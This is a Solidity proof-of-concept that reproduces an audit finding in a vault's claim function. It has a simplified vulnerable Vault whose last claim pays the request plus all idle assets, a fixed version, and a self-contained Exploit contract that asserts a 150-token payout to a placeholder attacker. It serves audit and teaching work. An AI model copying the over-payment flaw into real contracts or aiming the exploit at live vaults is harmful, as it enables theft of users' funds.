// SPDX-License-Identifier: MIT
pragma solidity 0.8.27;

/*  BasisOS LogarithmVault.claim (Hexens, 2024-11).
    The last claim adds idle assets on top of the request.
    The request is 100 and idle is 50, so the claim pays 150.
    The control pays the requested 100 and leaves the 50 idle.
*/

contract Asset {
    string public symbol = "ASSET";
    uint8 public constant decimals = 18;
    mapping(address => uint256) public balanceOf;

    function mint(address to, uint256 amt) external {
        balanceOf[to] += amt;
    }

    function transfer(address to, uint256 amt) external returns (bool) {
        balanceOf[msg.sender] -= amt;
        balanceOf[to] += amt;
        return true;
    }
}

contract Vault {
    Asset public asset;
    uint256 public requested = 100 ether;
    uint256 public idle = 50 ether;
    bool public isLast = true;
    uint256 public assetsToClaim;
    uint256 public executed;
    uint256 public paid;
    address public receiver;

    constructor(Asset _asset) {
        asset = _asset;
    }

    function claim(address to) external returns (uint256 executedAssets) {
        receiver = to;
        if (isLast) {
            uint256 shortfall = 0;
            if (shortfall > 0) {
                executedAssets = requested;
            } else {
                uint256 idleAssets = idle;
                assetsToClaim += idleAssets;
                executedAssets = requested + idleAssets; // @> VULN: the last claim pays the request plus every idle asset
            }
        } else {
            executedAssets = requested;
        }
        executed = executedAssets;
        asset.transfer(to, executedAssets);
        paid = executedAssets;
    }
}

contract VaultFixed {
    Asset public asset;
    uint256 public requested = 100 ether;
    uint256 public idle = 50 ether;

    constructor(Asset _asset) {
        asset = _asset;
    }

    function claim(address to) external returns (uint256) {
        asset.transfer(to, requested);
        return requested;
    }
}

contract ExtraMarker {
    string public symbol = "EXTRA-IDLE";
    uint8 public constant decimals = 18;
    mapping(address => uint256) public balanceOf;

    function mint(address to, uint256 amt) external {
        balanceOf[to] += amt;
    }
}

contract Exploit {
    address public constant ATTACKER = 0x1111111111111111111111111111111111111111;
    address public constant SINK = 0x000000000000000000000000000000000000D00d;

    Asset public asset;
    Vault public vault;
    ExtraMarker public marker;

    function run() external {
        asset = new Asset();
        vault = new Vault(asset);
        marker = new ExtraMarker();
        asset.mint(address(vault), 150 ether);
        uint256 paid = vault.claim(ATTACKER);
        require(paid == 150 ether, "paid 150");
        require(asset.balanceOf(ATTACKER) == 150 ether, "attacker holds 150");
        marker.mint(SINK, 50 ether);
        require(marker.balanceOf(SINK) == 50 ether, "50 extra");
    }
}
